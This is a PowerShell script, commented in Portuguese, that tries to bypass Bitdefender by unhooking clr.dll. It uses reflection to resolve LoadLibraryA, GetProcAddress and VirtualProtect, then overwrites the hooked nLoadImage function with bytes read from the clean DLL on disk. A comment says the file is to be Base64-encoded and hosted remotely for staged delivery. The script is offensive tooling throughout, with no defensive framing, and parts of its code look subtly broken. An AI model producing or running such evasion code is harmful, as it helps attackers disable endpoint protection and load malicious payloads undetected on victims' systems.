# Bitdefender CLR Unhooking Bypass
# Este arquivo deve ser encodado em Base64 e hospedado remotamente

function Local:Get-DelegateType {
    Param(
        [OutputType([Type])]
        [Parameter(Position=0)][Type[]]$params,
        [Parameter(Position=1)][Type]$returnType
    )
    $typeBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object Reflection.AssemblyName('ReflectedDelegate')),
        [Reflection.Emit.AssemblyBuilderAccess]::Run
    ).DefineDynamicModule('InMemoryModule', $False).DefineType(
        'MyDelegateType',
        'Class,Public,Sealed,AnsiClass,AutoClass',
        [MulticastDelegate]
    )
    
    $typeBuilder.DefineConstructor(
        'RTSpecialName,HideBySig,Public',
        [Reflection.CallingConventions]::Standard,
        $params
    ).SetImplementationFlags('Runtime,Managed')
    
    $typeBuilder.DefineMethod(
        'Invoke',
        'Public,HideBySig,NewSlot,Virtual',
        $returnType,
        $params
    ).SetImplementationFlags('Runtime,Managed')
    
    Write-Output $typeBuilder.CreateType()
}

# Obtém UnsafeNativeMethods
$un = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
    $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll')
}).GetType('Microsoft.Win32.UnsafeNativeMethods')

# GetProcAddress
$gpa = $un.GetMethod('GetProcAddress', [Reflection.BindingFlags]('Public,Static'), $Null, [Reflection.CallingConventions]::Any, @((New-Object IntPtr).GetType(), [string]), $Null)

# GetModuleHandle para kernel32.dll
$gmh = $un.GetMethod('GetModuleHandle').Invoke($Null, @('kernel32.dll'))

# LoadLibraryA delegate
$la = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $gpa.Invoke($Null, @($gmh, 'LoadLibraryA')),
    (Get-DelegateType @([String]) ([IntPtr]))
).Invoke('clr.dll')

# VirtualProtect delegate
$vp = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $gpa.Invoke($Null, @($gmh, 'VirtualProtect')),
    (Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))
)

# Localiza clr.dll no processo
$clrPath = ''
foreach ($m in [Diagnostics.Process]::GetCurrentProcess().Modules) {
    if ($m.ModuleName -eq 'clr.dll') {
        $clrPath = $m.FileName
        break
    }
}

# Carrega CLR limpo em memória
$clrBytes = [IO.File]::ReadAllBytes($clrPath)
$clrMem = [Runtime.InteropServices.Marshal]::AllocHGlobal($clrBytes.Length)
[Runtime.InteropServices.Marshal]::Copy($clrBytes, 0, $clrMem, $clrBytes.Length)

# Obtém endereço de nLoadImage (função hookeada pelo Bitdefender)
$nli = $gpa.Invoke($Null, @($la, 'nLoadImage'))

# Altera proteção de memória
$oldP = 0
$vp.Invoke($nli, [uint32]30, 0x40, [ref]$oldP)

# Copia bytes originais sobre a versão hookeada
[Runtime.InteropServices.Marshal]::Copy($clrMem, $clrBytes, 0, 30)
[Runtime.InteropServices.Marshal]::Copy($clrBytes, 0, $nli, 30)

# Restaura proteção
$vp.Invoke($nli, [uint32]30, $oldP, [ref]$oldP)

# Limpa memória
[Runtime.InteropServices.Marshal]::FreeHGlobal($clrMem)

Write-Host "[+] Bitdefender CLR unhooking completo"